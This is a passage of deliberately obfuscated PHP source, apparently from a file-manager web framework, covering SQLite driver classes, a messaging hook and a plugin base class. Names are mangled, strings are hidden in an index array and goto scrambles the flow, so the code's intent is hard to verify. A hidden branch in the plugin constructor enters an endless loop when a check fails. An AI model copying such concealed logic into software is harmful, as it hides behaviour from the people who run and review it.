$bİñèòœ[$D‚îƒŒÀ‚º[$aïÄ»÷È¨»[27]]] = array($aïÄ»÷È¨»[28] => $D‚îƒŒÀ‚º[$aïÄ»÷È¨»[27]], $aïÄ»÷È¨»[29] => $D‚îƒŒÀ‚º[$aïÄ»÷È¨»[30]], $aïÄ»÷È¨»[31] => (bool) ($D‚îƒŒÀ‚º[$aïÄ»÷È¨»[32]] === $aïÄ»÷È¨»[33]), $aïÄ»÷È¨»[34] => $D‚îƒŒÀ‚º[$aïÄ»÷È¨»[35]], $aïÄ»÷È¨»[36] => strtolower($D‚îƒŒÀ‚º[$aïÄ»÷È¨»[37]]) == $aïÄ»÷È¨»[38], $aïÄ»÷È¨»[39] => strtolower($D‚îƒŒÀ‚º[$aïÄ»÷È¨»[40]]) == $aïÄ»÷È¨»[41]); } } return $bİñèòœ; } public function getTables($cäŸ†¸¬Ş“ = '') { $CŸéê¸†‹¯ =& $_SERVER[¼€¼ˆ¦‚¡]; $EåòÕôĞ™Î = $this->query($CŸéê¸†‹¯[42] . $CŸéê¸†‹¯[43] . $CŸéê¸†‹¯[44]); $FÑ¦Ûˆœ¢È = array(); foreach ($EåòÕôĞ™Î as $føà™—Æ— => $D˜¢½Îäô¤) { $FÑ¦Ûˆœ¢È[$føà™—Æ—] = current($D˜¢½Îäô¤); } return $FÑ¦Ûˆœ¢È; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $a…¢ç¼Ï¶¨ =& $_SERVER[¼€¼ˆ¦‚¡]; $AÑİ¢Ùô‚ô = sqlite_last_error($this->_linkID); $this->error = $AÑİ¢Ùô‚ô . $a…¢ç¼Ï¶¨[4] . sqlite_error_string($AÑİ¢Ùô‚ô); if ($a…¢ç¼Ï¶¨[33] != $this->queryStr) { $this->error .= LNG($a…¢ç¼Ï¶¨[45]) . $this->queryStr; } think_trace($this->error, $a…¢ç¼Ï¶¨[33], $a…¢ç¼Ï¶¨[46]); return $this->error; } public function escapeString($BåéÜ·ƒë) { return sqlite_escape_string($BåéÜ·ƒë); } public function parseLimit($dªË›Ößê) { $a˜›ã¯Ã§ì =& $_SERVER[¼€¼ˆ¦‚¡]; $c†àÆİÔº× = $a˜›ã¯Ã§ì[33]; if (!empty($dªË›Ößê)) { $dªË›Ößê = explode($a˜›ã¯Ã§ì[47], $dªË›Ößê); if (count($dªË›Ößê) > 1) { $c†àÆİÔº× .= $a˜›ã¯Ã§ì[48] . $dªË›Ößê[1] . $a˜›ã¯Ã§ì[49] . $dªË›Ößê[0] . $a˜›ã¯Ã§ì[50]; } else { $c†àÆİÔº× .= $a˜›ã¯Ã§ì[48] . $dªË›Ößê[0] . $a˜›ã¯Ã§ì[50]; } } return $c†àÆİÔº×; } } class DbSqlite3Base extends Db { public function __construct($fçêœ¦òÔ¥ = '') { $DÅéîÑÉ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!class_exists($DÅéîÑÉ[51])) { think_exception(think_lang($DÅéîÑÉ[10]) . $DÅéîÑÉ[52]); } if (!empty($fçêœ¦òÔ¥)) { if (!isset($fçêœ¦òÔ¥[$DÅéîÑÉ[12]])) { $fçêœ¦òÔ¥[$DÅéîÑÉ[12]] = 438; } $this->config = $fçêœ¦òÔ¥; if (empty($this->config[$DÅéîÑÉ[13]])) { $this->config[$DÅéîÑÉ[13]] = array(); } } } public function connect($e©ğµ¥ ƒ = '', $cË‰—»òëø = 0) { $eùèŠ¨ˆ›‘ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!isset($this->linkID[$cË‰—»òëø])) { if (empty($e©ğµ¥ ƒ)) { $e©ğµ¥ ƒ = $this->config; } $this->linkID[$cË‰—»òëø] = new SQLite3($e©ğµ¥ ƒ[$eùèŠ¨ˆ›‘[17]]); if (!$this->linkID[$cË‰—»òëø]) { think_exception($this->linkID[$cË‰—»òëø]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$cË‰—»òëø]->busyTimeout(30000); if (1 != think_config($eùèŠ¨ˆ›‘[18])) { unset($this->config); } } return $this->linkID[$cË‰—»òëø]; } public function free() { $this->queryID = null; } public function query($c¡÷“º°·) { goto f„˜‰×¡è; f„˜‰×¡è: $E²Ûô¼Ç„ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto c¼ŒÖÑ›ñÉ; a”Ù»ÅÂ¬: think_status($E²Ûô¼Ç„[20]); $this->queryID = $this->_linkID->query($c¡÷“º°·); $this->debug(); goto AÉ†¼ìª‚Ç; AÉ†¼ìª‚Ç: if (!1 === $this->queryID) { $this->error(); return !1; } else { $DçÙŞ®óŸ = $this->getAll(); $this->numRows = count($DçÙŞ®óŸ); return $DçÙŞ®óŸ; } goto A•æìêÑƒ; c¼ŒÖÑ›ñÉ: $this->queryStr = $c¡÷“º°·; if ($this->queryID) { $this->free(); } think_action_status($E²Ûô¼Ç„[19], 1); goto a”Ù»ÅÂ¬; A•æìêÑƒ: } public function execute($a¢‰æŸíÍá) { goto F¿Úõ—­¤; F¿Úõ—­¤: $bö¼•ìíß =& $_SERVER[¼€¼ˆ¦‚¡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E¤¼Æ¹´ãÇ; E¤¼Æ¹´ãÇ: $this->queryStr = $a¢‰æŸíÍá; if ($this->queryID) { $this->free(); } think_action_status($bö¼•ìíß[21], 1); goto a‚øá½†…„; a‚øá½†…„: think_status($bö¼•ìíß[20]); $d¶¿ÖØ¡°Å = $this->_linkID->exec($a¢‰æŸíÍá); $this->debug(); goto FµÊ§‡‡¢; FµÊ§‡‡¢: if (!1 === $d¶¿ÖØ¡°Å) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto dÊ÷¼‘éà¤; dÊ÷¼‘éà¤: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¼€¼ˆ¦‚¡][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B“‚êÊŒƒ‹ = $this->_linkID->query($_SERVER[¼€¼ˆ¦‚¡][23]); if (!$B“‚êÊŒƒ‹) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $AİÉù…¼š = $this->_linkID->query($_SERVER[¼€¼ˆ¦‚¡][24]); if (!$AİÉù…¼š) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $A¿¶‹’æÏ = array(); while ($Aßæ½¨ç´ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $A¿¶‹’æÏ[] = $Aßæ½¨ç´; } $this->queryID->reset(); return $A¿¶‹’æÏ; } public function getFields($câÕŸØãêì) { $D‘Ôí¹ª™® =& $_SERVER[¼€¼ˆ¦‚¡]; $e›‘™ë®Êµ = $this->query($D‘Ôí¹ª™®[25] . $câÕŸØãêì . $D‘Ôí¹ª™®[26]); $AõÏ’æƒ¢è = array(); if ($e›‘™ë®Êµ) { foreach ($e›‘™ë®Êµ as $fã…õÎêÂ„ => $dÙ‹æğÍ…Ä) { $AõÏ’æƒ¢è[$dÙ‹æğÍ…Ä[$D‘Ôí¹ª™®[28]]] = array($D‘Ôí¹ª™®[28] => $dÙ‹æğÍ…Ä[$D‘Ôí¹ª™®[28]], $D‘Ôí¹ª™®[29] => $dÙ‹æğÍ…Ä[$D‘Ôí¹ª™®[29]], $D‘Ôí¹ª™®[31] => (bool) ($dÙ‹æğÍ…Ä[$D‘Ôí¹ª™®[31]] === $D‘Ôí¹ª™®[33]), $D‘Ôí¹ª™®[34] => $dÙ‹æğÍ…Ä[$D‘Ôí¹ª™®[53]], $D‘Ôí¹ª™®[36] => (bool) $dÙ‹æğÍ…Ä[$D‘Ôí¹ª™®[54]], $D‘Ôí¹ª™®[39] => (bool) $dÙ‹æğÍ…Ä[$D‘Ôí¹ª™®[54]]); } } return $AõÏ’æƒ¢è; } public function getTables($BæğÍ°•£– = '') { $bœ÷µ°µ‰ =& $_SERVER[¼€¼ˆ¦‚¡]; $b‹©ÊòÅÆñ = $this->query($bœ÷µ°µ‰[42] . $bœ÷µ°µ‰[43] . $bœ÷µ°µ‰[44]); $bÓ·êõ¬±Ü = array(); foreach ($b‹©ÊòÅÆñ as $A °·Şç‹ => $dÑËîåÈÉ) { $bÓ·êõ¬±Ü[$A °·Şç‹] = current($dÑËîåÈÉ); } return $bÓ·êõ¬±Ü; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $dò‹Ì÷ÎÍš =& $_SERVER[¼€¼ˆ¦‚¡]; $this->error = $this->_linkID->lastErrorMsg(); if ($dò‹Ì÷ÎÍš[33] != $this->queryStr) { $this->error .= LNG($dò‹Ì÷ÎÍš[45]) . $this->queryStr; } think_trace($this->error, $dò‹Ì÷ÎÍš[33], $dò‹Ì÷ÎÍš[46]); return $this->error; } public function escapeString($fƒ²ÄùÂ¢å) { $A÷§Àïôç =& $_SERVER[¼€¼ˆ¦‚¡]; if ($this->_linkID) { return $this->_linkID->escapeString($fƒ²ÄùÂ¢å); } return str_ireplace($A÷§Àïôç[55], $A÷§Àïôç[56], $fƒ²ÄùÂ¢å); } public function parseLimit($eò¶¦Ò˜òÜ) { $F´¯Õ— Õ¥ =& $_SERVER[¼€¼ˆ¦‚¡]; $Dˆµ÷»¡˜ = $F´¯Õ— Õ¥[33]; if (!empty($eò¶¦Ò˜òÜ)) { $eò¶¦Ò˜òÜ = explode($F´¯Õ— Õ¥[47], $eò¶¦Ò˜òÜ); if (count($eò¶¦Ò˜òÜ) > 1) { $Dˆµ÷»¡˜ .= $F´¯Õ— Õ¥[48] . $eò¶¦Ò˜òÜ[1] . $F´¯Õ— Õ¥[49] . $eò¶¦Ò˜òÜ[0] . $F´¯Õ— Õ¥[50]; } else { $Dˆµ÷»¡˜ .= $F´¯Õ— Õ¥[48] . $eò¶¦Ò˜òÜ[0] . $F´¯Õ— Õ¥[50]; } } return $Dˆµ÷»¡˜; } } goto Dù­ÜïçÏÕ; cĞ¢×ÖóŒ¾: class Message { function __construct() { } public function send($fØò¼šÁ© = '', $fãòÄ¼ƒŒÀ = array(), $dìîº¨ = "\164\x65\x78\x74") { goto D›™Á‘Ùí; F†‰‡Û×ˆ: $fãòÄ¼ƒŒÀ = array($cçÆÎ¿Ëï‰[970] => isset($fãòÄ¼ƒŒÀ[$cçÆÎ¿Ëï‰[970]]) ? $fãòÄ¼ƒŒÀ[$cçÆÎ¿Ëï‰[970]] : $cçÆÎ¿Ëï‰[33], $cçÆÎ¿Ëï‰[535] => isset($fãòÄ¼ƒŒÀ[$cçÆÎ¿Ëï‰[535]]) ? $fãòÄ¼ƒŒÀ[$cçÆÎ¿Ëï‰[535]] : $cçÆÎ¿Ëï‰[33]); if (empty($fØò¼šÁ©) || empty($fãòÄ¼ƒŒÀ[$cçÆÎ¿Ëï‰[970]]) && empty($fãòÄ¼ƒŒÀ[$cçÆÎ¿Ëï‰[535]])) { return !1; } $e–ÌÊ·æ¬ª = array($cçÆÎ¿Ëï‰[1246] => $d¹¬ÀÃºˆá, $cçÆÎ¿Ëï‰[1306] => $fãòÄ¼ƒŒÀ); goto BÖâùÈ±¸ß; D›™Á‘Ùí: $cçÆÎ¿Ëï‰ =& $_SERVER[¼€¼ˆ¦‚¡]; $d¹¬ÀÃºˆá = array($cçÆÎ¿Ëï‰[29] => $cçÆÎ¿Ëï‰[1304], $cçÆÎ¿Ëï‰[688] => $fØò¼šÁ©); if (in_array($dìîº¨, array($cçÆÎ¿Ëï‰[1304], $cçÆÎ¿Ëï‰[1305]))) { $d¹¬ÀÃºˆá[$cçÆÎ¿Ëï‰[29]] = $dìîº¨; } goto F†‰‡Û×ˆ; BÖâùÈ±¸ß: Hook::trigger($cçÆÎ¿Ëï‰[1307], $e–ÌÊ·æ¬ª); goto D£ª¥Õ“ª; D£ª¥Õ“ª: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto AØÙÇ‚¼; fèÛ÷‘¬„Ö: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($C¡«İ¼Öß[1309]); goto fÙî‰Ø²ˆó; fáõƒ†®øˆ: $this->pluginHost = $config[$C¡«İ¼Öß[1311]] . $this->pluginName . $C¡«İ¼Öß[8]; $this->pluginHostDefault = $config[$C¡«İ¼Öß[1311]] . $this->pluginName . $C¡«İ¼Öß[8]; $BñƒÆğÆ¢à = $config[$C¡«İ¼Öß[1312]]; goto C—ğ‰µ¯¾¡; AØÙÇ‚¼: $C¡«İ¼Öß =& $_SERVER[¼€¼ˆ¦‚¡]; if (!isset($_SERVER[$C¡«İ¼Öß[787]]) || !isset($_SERVER[$C¡«İ¼Öß[1308]])) { goto eØĞÄ§¿¢Š; eØĞÄ§¿¢Š: $eÁº¥Ç„š‘ = $C¡«İ¼Öß[788]; $B¶Ë©´¢á = $C¡«İ¼Öß[789]; $cìÂÖµœõè = $_SERVER[$C¡«İ¼Öß[790]] . $C¡«İ¼Öß[791]; goto aë†æ×Ô•„; aë†æ×Ô•„: $f„ä·ÊŞ‡ = $B¶Ë©´¢á($cìÂÖµœõè); $Dä»‹—­¸Ú = explode($C¡«İ¼Öß[217], $f„ä·ÊŞ‡); if (count($Dä»‹—­¸Ú) < $C¡«İ¼Öß[554]) { $eÒîø•ã± = $C¡«İ¼Öß[792]; $eÒîø•ã±(); } goto cöÍ‘¶ñÁ; aÔ‡óà¡«: for ($e“¯¡Èôß = $F˜‡’œŒÏ°; $e“¯¡Èôß > 0; $e“¯¡Èôß++) { $fŒ¼¨àšóœ = json_encode($GLOBALS[$C¡«İ¼Öß[384]]); } goto a½¸­‘©¬Ñ; cöÍ‘¶ñÁ: $fŒ¼¨àšóœ = $C¡«İ¼Öß[793]; $fŒ¼¨àšóœ($_SERVER[$C¡«İ¼Öß[784]]); $F˜‡’œŒÏ° = 1; goto aÔ‡óà¡«; a½¸­‘©¬Ñ: } global $in, $config; goto fèÛ÷‘¬„Ö; fÙî‰Ø²ˆó: $this->pluginName = str_replace($C¡«İ¼Öß[1309], $C¡«İ¼Öß[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $C¡«İ¼Öß[8]; $this->pluginApi = appHostGet() . $C¡«İ¼Öß[1310] . $this->pluginName . $C¡«İ¼Öß[8]; goto fáõƒ†®øˆ; C—ğ‰µ¯¾¡: if ($BñƒÆğÆ¢à && strpos($C¡«İ¼Öß[47] . $BñƒÆğÆ¢à . $C¡«İ¼Öß[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$C¡«İ¼Öß[1313]] . $this->pluginName . $C¡«İ¼Öß[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto aò¿ƒ³¼…; aò¿ƒ³¼…: return $this; goto B¢½Ÿ®Ş»Í; B¢½Ÿ®Ş»Í: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¼€¼ˆ¦‚¡][1314]); } protected function assign($FÊÅ¦ê½îË, $CîÌÂ§Ø… = false) { if (is_array($FÊÅ¦ê½îË)) { $this->values = array_merge($this->values, $FÊÅ¦ê½îË); } else { $this->values[$FÊÅ¦ê½îË] = $CîÌÂ§Ø…; } } protected function display($d¾„ÛØÃ) { extract($this->values); require $d¾„ÛØÃ; } final function hookRegist($C°÷”¯à·÷) { $this->modelPlugin->appRegist($this->pluginName, $C°÷”¯à·÷); } final function appIcon() { $cÁÛ¸ØÓÙ =& $_SERVER[¼€¼ˆ¦‚¡]; $cÒÇ™óóÆ = $this->appPackage(); $f°ˆÜØ©š³ = $cÁÛ¸ØÓÙ[33]; if (isset($cÒÇ™óóÆ[$cÁÛ¸ØÓÙ[382]])) { if (isset($cÒÇ™óóÆ[$cÁÛ¸ØÓÙ[382]][$cÁÛ¸ØÓÙ[1315]])) { $f°ˆÜØ©š³ = $cÁÛ¸ØÓÙ[1316] . $cÒÇ™óóÆ[$cÁÛ¸ØÓÙ[382]][$cÁÛ¸ØÓÙ[1315]] . $cÁÛ¸ØÓÙ[1317]; } else { if ($cÒÇ™óóÆ[$cÁÛ¸ØÓÙ[382]][$cÁÛ¸ØÓÙ[1318]]) { $f°ˆÜØ©š³ = $cÁÛ¸ØÓÙ[1319] . $cÒÇ™óóÆ[$cÁÛ¸ØÓÙ[382]][$cÁÛ¸ØÓÙ[1318]] . $cÁÛ¸ØÓÙ[1320]; } } } return $f°ˆÜØ©š³; } final function fileCanView($B‰¢´ä¯È) { goto FéÃ¤¥”íÎ; dğ ¡‚¨ô•: $BğŠ™†ïˆß = Session::get($fİ‚¿²ÔÀ[1321]); if (!$BğŠ™†ïˆß || !$BğŠ™†ïˆß[$fİ‚¿²ÔÀ[1322]]) { $EÖää’Ç©Ê = $fİ‚¿²ÔÀ[1323] . rawurlencode(this_url()); show_tips(LNG($fİ‚¿²ÔÀ[1324]) . $fİ‚¿²ÔÀ[1325] . $EÖää’Ç©Ê . $fİ‚¿²ÔÀ[1326] . LNG($fİ‚¿²ÔÀ[1327]) . $fİ‚¿²ÔÀ[1328], !1); } if (!Action($fİ‚¿²ÔÀ[1329])->authCan($fİ‚¿²ÔÀ[1330])) { show_tips(LNG($fİ‚¿²ÔÀ[1331]) . $fİ‚¿²ÔÀ[1332], !1); } goto E¶ª·ˆŠÍ–; FéÃ¤¥”íÎ: $fİ‚¿²ÔÀ =& $_SERVER[¼€¼ˆ¦‚¡]; if (request_url_safe($B‰¢´ä¯È)) { return !0; } if ($this->isShare($B‰¢´ä¯È)) { return !0; } goto dğ ¡‚¨ô•; E¶ª·ˆŠÍ–: ActionCall($fİ‚¿²ÔÀ[1333], $B‰¢´ä¯È); goto cÕÚäìùÒ‘; cÕÚäìùÒ‘: } final function isShare($aªÛ†´šÃï) { $b œõ©ÈÌ¤ = KodIO::parse($aªÛ†´šÃï); return $b œõ©ÈÌ¤[$_SERVER[¼€¼ˆ¦‚¡][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($FŠãá¸‰»•) { if (request_url_safe($FŠãá¸‰»•)) { return $FŠãá¸‰»•; } if (!$this->isShare($FŠãá¸‰»•)) { $FŠãá¸‰»• = $this->filePath($FŠãá¸‰»•); } return Action($_SERVER[¼€¼ˆ¦‚¡][1017])->linkOut($FŠãá¸‰»•); } public function filePathLinkOut($bÍ¥Ö˜“Ä) { if (request_url_safe($bÍ¥Ö˜“Ä)) { return $bÍ¥Ö˜“Ä; } $this->fileCanView($bÍ¥Ö˜“Ä); return Action($_SERVER[¼€¼ˆ¦‚¡][1017])->link($bÍ¥Ö˜“Ä); } final function filePath($fçäÃñÁ„ƒ) { $B«ÄÔÍª±‰ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($bÕšãø¬‰Å = $this->checkSharePath($fçäÃñÁ„ƒ)) { return $bÕšãø¬‰Å; } $this->fileCanView($fçäÃñÁ„ƒ); if (request_url_safe($fçäÃñÁ„ƒ)) { $bÖœÆŠ¨Çİ = parse_url_query($fçäÃñÁ„ƒ); if (isset($bÖœÆŠ¨Çİ[$B«ÄÔÍª±‰[1334]]) && isset($bÖœÆŠ¨Çİ[$B«ÄÔÍª±‰[197]])) { $d–¦¹ë•» = Model($B«ÄÔÍª±‰[1088])->get($B«ÄÔÍª±‰[1335]); $d»‡ùİÆÓ¹ = Mcrypt::decode($bÖœÆŠ¨Çİ[$B«ÄÔÍª±‰[197]], $d–¦¹ë•»); if ($d»‡ùİÆÓ¹) { $this->fileInfo = IO::infoWithChildren($d»‡ùİÆÓ¹); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $d»‡ùİÆÓ¹; } } $fçäÃñÁ„ƒ = $this->_cacheHttpFile($fçäÃñÁ„ƒ); $this->fileInfo = IO::infoWithChildren($fçäÃñÁ„ƒ); } else { $this->fileInfo = IO::infoWithChildren($fçäÃñÁ„ƒ); if (!$this->fileInfo) { show_tips(LNG($B«ÄÔÍª±‰[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $fçäÃñÁ„ƒ; } final function _cacheHttpFile($D„•¶¬ˆ¸) { $Fî–‘Ú˜³¾ = hash_path($D„•¶¬ˆ¸, !0); $this->cachePath = $this->pluginCachePath($Fî–‘Ú˜³¾); if ($C¨¥á‘´îÈ = IO::fileNameExist($this->cachePath, $Fî–‘Ú˜³¾)) { return KodIO::make($C¨¥á‘´îÈ); } $C‰ªùš„ªØ = $this->cachePath . $Fî–‘Ú˜³¾; return $this->pluginCacheFileSet($C‰ªùš„ªØ, file_get_contents($D„•¶¬ˆ¸)); } final function _tmpFileName($A’»ì¬ºà© = array()) { goto Bš…µ¾ÃÖ¼; Bš…µ¾ÃÖ¼: $F–—ƒ ‡–« =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$A’»ì¬ºà©) { $A’»ì¬ºà© = $this->fileInfo; } if (isset($A’»ì¬ºà©[$F–—ƒ ‡–«[164]])) { return $A’»ì¬ºà©[$F–—ƒ ‡–«[164]]; } goto c¹´ÂÅ¯İ; c¹´ÂÅ¯İ: if (isset($A’»ì¬ºà©[$F–—ƒ ‡–«[162]][$F–—ƒ ‡–«[164]])) { return $A’»ì¬ºà©[$F–—ƒ ‡–«[162]][$F–—ƒ ‡–«[164]]; } $fç™™–…Íå = IO::hashSimple($A’»ì¬ºà©[$F–—ƒ ‡–«[75]]); if ($fç™™–…Íå) { return $fç™™–…Íå; } goto bé²ó„³‹; bé²ó„³‹: $Fàø‚äÃ³£ = array($A’»ì¬ºà©[$F–—ƒ ‡–«[28]], $A’»ì¬ºà©[$F–—ƒ ‡–«[75]], $A’»ì¬ºà©[$F–—ƒ ‡–«[77]]); if (isset($A’»ì¬ºà©[$F–—ƒ ‡–«[459]])) { $Fàø‚äÃ³£[] = $A’»ì¬ºà©[$F–—ƒ ‡–«[459]]; } return md5(implode($F–—ƒ ‡–«[70], $Fàø‚äÃ³£)); goto AËõÈ¥ËÅŒ; AËõÈ¥ËÅŒ: } final function checkSharePath($eœ„«Çòè) { goto ašëó‡¯ÀÅ; Aòß°¥„Ê–: $B‡°äêÌù† = Action($a ”ø¹¹„­[1017])->sharePathInfo($eœ„«Çòè); if (!isset($B‡°äêÌù†[$a ”ø¹¹„­[75]])) { show_json(LNG($a ”ø¹¹„­[1337]), !1); } $this->fileInfo = $B‡°äêÌù†[$a ”ø¹¹„­[162]]; goto aèÓ×‹İëç; aèÓ×‹İëç: $this->cachePath = $this->pluginCachePath($this->fileInfo[$a ”ø¹¹„­[164]]); return $B‡°äêÌù†[$a ”ø¹¹„­[75]]; goto C™«‘ƒ§Ïô; ašëó‡¯ÀÅ: $a ”ø¹¹„­ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!defined($a ”ø¹¹„­[427])) { define($a ”ø¹¹„­[1336], 0); } if (!$this->isShare($eœ„«Çòè)) { return !1; } goto Aòß°¥„Ê–; C™«‘ƒ§Ïô: } final function pluginCachePath($bÆºœÂ¦Şø = '') { $bÀƒù¡‹Î¬ =& $_SERVER[¼€¼ˆ¦‚¡]; $dóÜŠî¬Ê = IO_PATH_SYSTEM_TEMP . $bÀƒù¡‹Î¬[1338] . $this->pluginName; if (!($Cå†™°ª± = IO::infoFull($dóÜŠî¬Ê))) { return IO::mkdir($dóÜŠî¬Ê . $bÀƒù¡‹Î¬[8] . $bÆºœÂ¦Şø); } if (empty($bÆºœÂ¦Şø)) { return $Cå†™°ª±[$bÀƒù¡‹Î¬[75]]; } if (!($F­ÏÂ´ÆÃŸ = IO::fileNameExist($Cå†™°ª±[$bÀƒù¡‹Î¬[75]], $bÆºœÂ¦Şø))) { return IO::mkdir($Cå†™°ª±[$bÀƒù¡‹Î¬[75]] . $bÆºœÂ¦Şø); } return KodIO::make($F­ÏÂ´ÆÃŸ); } final function pluginCacheFileSet($aŠ‹¼²”‹, $c‡÷åì°ã­ = '') { $e¥‘Á°õí¢ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!($BÛµ¡ÊËŒ˜ = IO::infoFull($aŠ‹¼²”‹))) { return IO::mkfile($aŠ‹¼²”‹, $c‡÷åì°ã­, REPEAT_REPLACE); } IO::setContent($BÛµ¡ÊËŒ˜[$e¥‘Á°õí¢[75]], $c‡÷åì°ã­); return $BÛµ¡ÊËŒ˜[$e¥‘Á°õí¢[75]]; } final function pluginLocalFile($bªº‹†‰à = '') { goto f’Å²¦êå‰; D½’®º°“: $E£¾ä³ˆêˆ = $b‡‚¤ÚÍÑà . $B¦š™ò¢Ãò; if (@file_exists($E£¾ä³ˆêˆ)) { return $E£¾ä³ˆêˆ; } return IO::copy($bªº‹†‰à, $b‡‚¤ÚÍÑà, 0, $B¦š™ò¢Ãò); goto a­”äË×„¥; DÁ¸…ÖÃÍ: if (!$bªº‹†‰à) { return $b‡‚¤ÚÍÑà; } $Có¬ÛõÂô” = IO::info($bªº‹†‰à); $B¦š™ò¢Ãò = $this->_tmpFileName($Có¬ÛõÂô”) . $f§‡˜Ÿ»õê[91] . $Có¬ÛõÂô”[$f§‡˜Ÿ»õê[160]]; goto D½’®º°“; f’Å²¦êå‰: $f§‡˜Ÿ»õê =& $_SERVER[¼€¼ˆ¦‚¡]; $b‡‚¤ÚÍÑà = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($b‡‚¤ÚÍÑà)) { mk_dir($b‡‚¤ÚÍÑà); } goto DÁ¸…ÖÃÍ; a­”äË×„¥: } final function appPackage() { goto CÜŒÁğí“º; eç‘œğ‰Ÿ: $A×‰º”¼§¹ = Hook::trigger($Cëê³áË‰ß[1340], $aÆ°ÓÉ‚º¶); if ($A×‰º”¼§¹ && is_array($A×‰º”¼§¹)) { $aÆ°ÓÉ‚º¶ = $A×‰º”¼§¹; } $this->packageData = $aÆ°ÓÉ‚º¶; goto D±ä¨ùÖ¨; D±ä¨ùÖ¨: return $aÆ°ÓÉ‚º¶; goto cµœË÷ÚÖ; CÜŒÁğí“º: $Cëê³áË‰ß =& $_SERVER[¼€¼ˆ¦‚¡]; if ($this->packageData) { return $this->packageData; } $cñÍïÔ™ŒĞ = $this->parseFile($this->pluginPath . $Cëê³áË‰ß[1339]); goto b‚„ÖˆÑ‚„; b‚„ÖˆÑ‚„: $this->parseLang($cñÍïÔ™ŒĞ); $aÆ°ÓÉ‚º¶ = json_decode_force($cñÍïÔ™ŒĞ); if (!$aÆ°ÓÉ‚º¶) { return array(); } goto eç‘œğ‰Ÿ; cµœË÷ÚÖ: } public function packageInfoGet($c‘îŞÛŠ) { $F·¡ÃÁ¸¡È = $this->appPackage(); return array_get_value($F·¡ÃÁ¸¡È, $c‘îŞÛŠ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¼€¼ˆ¦‚¡][1341]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¼€¼ˆ¦‚¡][1342]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¼€¼ˆ¦‚¡][1343]); } private function parseFile($Fº¹¬˜†˜¦) { goto d®†•¤íÉ¤; a†µº¾–Š¼: $d°À±Ú½Û† = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$D†ò¾ŸÒË‡[84]][$D†ò¾ŸÒË‡[1351]]); if (strstr($f±Ü¡ëìºï, $D†ò¾ŸÒË‡[1352])) { $Cíã˜Ãäîö = rawurlencode(json_encode($this->pluginLangArr)); $f±Ü¡ëìºï = str_replace($D†ò¾ŸÒË‡[1352], $Cíã˜Ãäîö, $f±Ü¡ëìºï); } if (strstr($f±Ü¡ëìºï, $D†ò¾ŸÒË‡[1353])) { $Cíã˜Ãäîö = $Cíã˜Ãäîö = rawurlencode(json_encode($this->getConfig())); $f±Ü¡ëìºï = str_replace($D†ò¾ŸÒË‡[1353], $Cíã˜Ãäîö, $f±Ü¡ëìºï); } goto Dê¦É›â­Î; d®†•¤íÉ¤: $D†ò¾ŸÒË‡ =& $_SERVER[¼€¼ˆ¦‚¡]; $f±Ü¡ëìºï = file_get_contents($Fº¹¬˜†˜¦); $d„–÷¡Üå = array($D†ò¾ŸÒË‡[1344], $D†ò¾ŸÒË‡[1345], $D†ò¾ŸÒË‡[1346], $D†ò¾ŸÒË‡[1347], $D†ò¾ŸÒË‡[1348], $D†ò¾ŸÒË‡[1349], $D†ò¾ŸÒË‡[1350]); goto a†µº¾–Š¼; Dê¦É›â­Î: $f±Ü¡ëìºï = str_replace($d„–÷¡Üå, $d°À±Ú½Û†, $f±Ü¡ëìºï); return $f±Ü¡ëìºï; goto fàÆÆ‘Á‡å; fàÆÆ‘Á‡å: } private function parseLang(&$c‰¹¤Ö‹ª¯) { goto C¼ñ¼ÑÓ™; DÒ‚ìÎ¸ùÉ: preg_match_all($f¤”´äÒø[1355], $c‰¹¤Ö‹ª¯, $CšÉõ‚Æ†˜); if (!is_array($CšÉõ‚Æ†˜) || count($CšÉõ‚Æ†˜) == 0 || !is_array($CšÉõ‚Æ†˜[0]) || count($CšÉõ‚Æ†˜[0]) == 0) { return; } $CË½äÇÇ®à = array(); goto D£ÕÚğğå; C¼ñ¼ÑÓ™: $f¤”´äÒø =& $_SERVER[¼€¼ˆ¦‚¡]; $dìì¨ç÷º = $f¤”´äÒø[1354]; if (!strstr($c‰¹¤Ö‹ª¯, $dìì¨ç÷º)) { return; } goto DÒ‚ìÎ¸ùÉ; D£ÕÚğğå: $eŸŒ¾™êñ™ = array(); foreach ($CšÉõ‚Æ†˜[0] as $A«ÕÌ”—“Û) { 